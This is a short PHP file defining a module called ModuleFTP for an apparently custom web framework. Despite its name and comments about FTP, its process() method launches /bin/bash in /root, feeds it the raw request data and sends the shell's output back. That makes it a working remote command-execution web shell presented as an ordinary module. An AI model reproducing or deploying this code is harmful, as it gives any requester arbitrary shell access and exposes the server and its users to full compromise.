<?php

class ModuleFTP extends Module
{
  function __construct($name)
  {
    parent::__construct($name);
    if (self::$debug || $this->localdebug)
      $this->doDebug("ModuleFTP->__construct()", WADebug::SYSTEM);
  }

  public function start($protocol)
  {
    // Register hook to process requests
    $protocol->registerHook('process', $this->name, "process");
  }

  // We do not need [header] method to notify about body since we do not need body.

  // we should passthrough files without memory cache ? any send hook function ?
  public function process($request, $response)
  {
    if (self::$debug || $this->localdebug)
      $this->doDebug("ModuleFTP->process($request, $response)", WADebug::SYSTEM);

    if ($response->content)
      return;

    // not opened ? create a pipe to a FTP and send anything there
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
    );

    $cwd = '/root';

    $process = proc_open('/bin/bash', $descriptorspec, $pipes, $cwd, null);

    if (is_resource($process))
    {
      // $pipes now looks like this:
      // 0 => writeable handle connected to child stdin
      // 1 => readable handle connected to child stdout
      // Any error output will be appended to /tmp/error-output.txt

      fwrite($pipes[0], $request->data);
      $response->addData(stream_get_contents($pipes[1]));
    }
  }
}


?>